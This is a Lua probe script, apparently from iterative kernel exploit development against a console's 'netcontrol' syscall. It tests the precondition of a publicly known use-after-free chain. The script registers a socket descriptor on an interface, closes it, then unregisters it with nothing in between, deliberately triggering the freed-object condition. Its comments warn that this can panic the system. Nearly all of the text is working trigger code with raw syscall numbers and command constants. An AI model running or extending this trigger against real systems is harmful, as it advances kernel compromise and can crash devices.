-- CRASH_CLASS: HIGH
-- PROBE 225a: netcontrol, the close-then-unregister trigger on a clean interface
--
-- Context: 224a shows the queue is interface-scoped. ifindex -1, which the
-- public ABI uses and which 218a/219a used, now refuses every register in a
-- fresh process (pid 239), while ifindex 1 accepts a register and an unregister
-- and returns 0 for both. So 219a's orphan is still sitting on index -1 after
-- the process that made it died - or index -1 means something else entirely.
--
-- That gives a clean testbed for the public chain's precondition:
--
--   [A] index 1 control: register and unregister one open descriptor.
--   [B] index 1 trigger: register, close, unregister with nothing opening a
--       descriptor in between, so the number is not reclaimed.
--   [C] after the trigger, does index 1 still accept a register, and does an
--       independent index 2 still accept one?
--
-- RISK: [B] is the use-after-free condition of the <=12.00 chain with no spray
-- and no reclaim. A panic needs a power cycle.

print("=== PROBE 225a: netcontrol trigger on a clean interface ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(v)
    if type(v) == "number" then
        if v < 0 then v = 0x100000000 + v end
        return uint64(string.format("0x%08X", v))
    end
    return v
end
local function sgn(v)
    if v == nil then return "killed" end
    if v >= 0x80000000 then return tostring(v - 0x100000000) end
    return tostring(v)
end
local dead = false

local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then
        dead = true
        return nil, nil
    end
    return ret, to_num(ret)
end

local BUF = memory.alloc(0x20)
local function zero(addr, n)
    for i = 0, n - 1, 4 do
        pcall(function() memory.write_dword(addr + i, 0) end)
    end
end
local function wd(addr, v)
    return (pcall(function() memory.write_dword(addr, v) end))
end

local SET_QUEUE = 0x20000003
local CLEAR_QUEUE = 0x20000007

local function pid()
    local _, v = call(20)
    return sgn(v)
end
local function reg(ifindex, fd, cmd)
    zero(BUF, 0x10)
    wd(BUF, fd)
    local _, v = call(99, ifindex, cmd, BUF, 8)
    return v
end

print("    pid " .. pid())
print("")

print("[A] index 1 control: register and unregister one open descriptor")
local _, afd = call(97, 1, 1, 0)
local a1, a2
if afd ~= nil and afd >= 0 then
    a1 = reg(1, afd, SET_QUEUE)
    a2 = reg(1, afd, CLEAR_QUEUE)
    print(string.format("    fd %s  register %s  unregister %s", sgn(afd), sgn(a1), sgn(a2)))
    call(6, afd)
end
print("")

if a1 == 0 and a2 == 0 then
    print("[B] trigger on index 1: register, close, unregister, nothing in between")
    local _, bfd = call(97, 1, 1, 0)
    print("    fd " .. sgn(bfd))
    if bfd ~= nil and bfd >= 0 and not dead then
        print("    register -> " .. sgn(reg(1, bfd, SET_QUEUE)))
        local _, bc = call(6, bfd)
        print("    close    -> " .. sgn(bc))
        local b3 = reg(1, bfd, CLEAR_QUEUE)
        print("    unregister -> " .. sgn(b3))
        print("    pid after  -> " .. pid())
    end
    print("")

    print("[C] after the trigger: index 1, then an independent index 2")
    local _, cfd = call(97, 1, 1, 0)
    if cfd ~= nil and cfd >= 0 and not dead then
        print(string.format("    fd %s index 1 register -> %s", sgn(cfd), sgn(reg(1, cfd, SET_QUEUE))))
        print(string.format("    fd %s index 2 register -> %s", sgn(cfd), sgn(reg(2, cfd, SET_QUEUE))))
        print(string.format("    fd %s index 2 unregister -> %s", sgn(cfd), sgn(reg(2, cfd, CLEAR_QUEUE))))
    end
    print("    pid -> " .. pid())
else
    print("[B] skipped: the control did not pass on index 1")
end
print("")
print("=== PROBE 225a COMPLETE ===")
